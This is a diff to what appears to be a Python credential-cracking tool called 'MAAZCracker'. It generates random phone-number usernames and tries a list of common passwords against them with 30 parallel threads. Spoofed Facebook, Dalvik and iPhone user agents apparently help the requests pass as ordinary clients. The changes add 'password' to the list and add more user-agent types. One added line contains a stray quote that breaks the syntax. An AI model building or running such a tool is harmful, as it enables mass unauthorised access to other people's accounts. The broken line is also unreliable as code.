@@ -82,7 +82,7 @@ class UserAgentGenerator:
         return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 [{resolution}]"
 
     def generate_user_agent(self):
-        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'Custom'))
+        user_agent_type = random.choice(('Mozilla', 'Opera', 'Windows', 'Android', 'Tablet', ' 'Facebook', 'Dalvik', 'iPhone', 'Custom'))
         if user_agent_type == 'Mozilla':
             return self._generate_mozilla_user_agent()
         else:
@@ -160,7 +160,7 @@ class MAAZCracker:
             return
 
         targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
-        passlist = ['123456', '1234567', '12345678', '123456789', '1234567890', '123123']
+        passlist = ['123456', '1234567', '12345678', '123456789', '1234567890', '123123', 'password']
 
         with tred(max_workers=30) as executor:
             clear()
